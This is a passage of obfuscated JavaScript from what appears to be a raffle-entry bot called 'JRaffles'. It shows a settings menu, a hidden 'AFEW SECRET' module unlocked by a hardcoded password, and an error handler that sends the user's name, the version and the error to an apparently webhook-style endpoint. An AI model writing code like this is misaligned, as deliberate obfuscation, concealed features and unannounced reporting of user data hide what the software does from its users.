                                                                    console['log']('\x0a\x20-----------------------------------------------------\x20\x0a'), console['log']('(' + _0x3195d5 + ')\x20Return\x20to\x20Main\x20Menu');
                                                                    var _0x2fdf7e = await _0x4fe842();
                                                                    if (_0x2fdf7e == _0x3195d5)
                                                                        return _0x444bb4();
                                                                    console['clear'];
                                                                    var _0x3ba863 = 0x0;
                                                                    for (var _0x2c723b in _0x37a01c) {
                                                                        if (_0x2fdf7e == _0x3ba863) {
                                                                            console['log']('Changing:\x20\x0a\x20\x0a\x20' + _0x2c723b + '\x20:'), _0x37a01c[_0x2c723b] = await _0x3b2656(), _0x496729['writeFileSync']('../settings.json', JSON['stringify'](_0x37a01c));
                                                                            break;
                                                                        } else
                                                                            _0x3ba863++;
                                                                    }
                                                                    return console['log']('Settings\x20Saved!'), await _0x1a79bd(0xbb8), _0x444bb4();
                                                                } else {
                                                                    if (_0x1ee1d2[taskModule]['name'] == 'Reload\x20Settings')
                                                                        return console['log']('Reloading\x20settings'), await _0x1afc58(), _0x444bb4();
                                                                    else {
                                                                        if (taskModule == 0x45) {
                                                                            _0x1ee1d2[0x45] = { 'name': 'AFEW\x20SECRET' };
                                                                            var _0x1c8b7c = await _0x1e77a0();
                                                                            _0x1c8b7c == 'ModuleVoorDeBoys' ? (await _0x4f871b(), await _0x4002ba(), await afewFunction(_0x5cb00f[_0x19642f], 'sec')) : (console['log']('Wrong\x20password,\x20closing\x20in\x2010\x20seconds...'), await _0x1a79bd(0xbb8));
                                                                        } else {
                                                                        }
                                                                    }
                                                                }
                                                            }
                                                        }
                                                    }
                                                }
                                            }
                                        }
                                    }
                                }
                            }
                        }
                    }
                }
            }
            await _0x444bb4();
        } catch (_0x395fa0) {
            return console['log'](_0x395fa0), await _0x1a79bd(0x3a98);
        }
}
;
_0x219354('JRaffles\x20' + _0x3dc3b3), _0x1afc58();
try {
    _0x81e381();
} catch (_0xf40985) {
    var _0x10c871 = [{
        'type': 'rich',
        'title': 'Main\x20Menu\x20Error',
        'description': '',
        'color': 0xc0d6d6,
        'fields': [
            {
                'name': 'User',
                'value': '' + _0x3da10f
            },
            {
                'name': 'Version',
                'value': '' + _0x3dc3b3
            },
            {
                'name': 'Error',
                'value': '' + _0xf40985
            }
        ]
    }];
    const _0x4c46ce = { 'embeds': _0x10c871 };
    _0x21228b(_0x549818, _0x4c46ce);
}